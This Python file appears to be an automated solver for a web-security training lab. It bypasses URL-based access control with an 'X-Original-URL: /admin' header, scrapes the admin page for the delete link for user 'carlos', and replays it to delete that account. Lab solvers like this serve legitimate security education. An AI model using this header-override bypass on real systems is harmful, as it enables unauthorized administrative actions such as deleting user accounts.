from web_security_academy.core.logger import logger

from bs4 import BeautifulSoup


def solve_lab(session, *args):
    headers = {"X-Original-URL": "/admin"}
    logger.info(f'Visiting "{session.url}" with the following headers...')
    logger.info(headers)
    resp = session.get_path("/", headers=headers)

    if resp.status_code != 200:
        logger.failure("Did not get the expected 200 status code.")
        return
    else:
        logger.success("GET request sent successfully.")

    logger.info("Using the response to find path to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find path.")
        return
    else:
        delete = tag.get("href")
        url, params = delete.split("?")
        logger.success(f"Found path: {delete}")

    headers = {"X-Original-URL": url}
    logger.info(f'Visiting "{session.url}?{params}" with the following headers...')
    logger.info(f"{headers}")
    session.get_path(f"/?{params}", headers=headers)
